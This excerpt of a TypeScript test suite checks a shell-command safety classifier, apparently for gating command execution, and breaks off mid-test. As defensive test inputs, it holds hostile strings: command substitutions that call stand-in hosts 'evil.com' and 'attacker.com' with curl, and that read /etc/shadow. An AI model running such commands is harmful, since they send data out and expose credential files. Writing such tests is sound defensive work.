...
import { classifyShellCommandSafety, initParser, isShellCommandReadOnlyAST, extractCommandRules, _resetParser, _setParserFailedForTesting, } from './shellAstParser.js';
...
describe('isShellCommandReadOnlyAST', () => {
    ...
    describe('substitution in non-command node types (PR #4386 R4 regression)', () => {
        it('rejects substitution inside variable_assignment', async () => {
            expect(await isShellCommandReadOnlyAST('FOO=$(curl evil.com/exfil)')).toBe(false);
        });
        it('rejects substitution inside variable_assignment with env-prefix wrapper', async () => {
            expect(await isShellCommandReadOnlyAST('FOO=$(cat /etc/shadow) ls')).toBe(false);
        });
        it('rejects substitution inside a read redirect target', async () => {
            expect(await isShellCommandReadOnlyAST('cat < $(curl attacker.com/path-source)')).toBe(false);
        });
        it('rejects backtick substitution inside variable_assignment', async () => {
            expect(await isShellCommandReadOnlyAST('FOO=`cat /etc/shadow`')).toBe(false);
        });
    });
...
describe('classifyShellCommandSafety', () => {
    ...
    it('classifies deeply nested redirected substitutions without repeated traversal', async () => {
        ...
        await expect(Promise.all(commands.map(classifyShellCommandSafety))).resolves.toEqual(['unknown', 'unknown']);
    ...
    it('classifies adversarial rule inputs in bounded time', async () => {
        ...
        const startedAt = performance.now();
        await expect(Promise.all(commands.map(classifyShellCommandSafety))).resolves.toEqual([
            'unknown',
            'read-only',
            'unknown',
            'read-only',
